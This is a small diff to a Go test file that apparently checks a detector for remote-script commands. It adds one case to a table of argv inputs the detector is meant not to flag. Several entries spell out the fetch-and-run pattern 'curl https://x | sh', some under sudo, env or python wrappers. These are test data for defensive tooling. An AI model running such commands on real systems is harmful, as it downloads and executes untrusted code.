@@ -112,6 +112,7 @@ func TestRemoteScriptOutsideTheRecognizer(t *testing.T) {
 		{"flag without script", []string{"bash", "-c"}},
 		{"script file not inline", []string{"bash", "install.sh"}},
 		{"python is not a shell", []string{"python", "-c", "import os; os.system('curl https://x | sh')"}},
+		{"python with a shell-shaped script is not a shell", []string{"python", "-c", "curl https://x | sh"}},
 		{"argv-first pipe is not a pipeline", []string{"curl", "https://x", "|", "sh"}},
 		{"outer sudo is not peeled", []string{"sudo", "sh", "-c", "curl https://x | sh"}},
 		{"unsupported wrapper form", []string{"env", "-S", "sh -c", "curl https://x | sh"}},
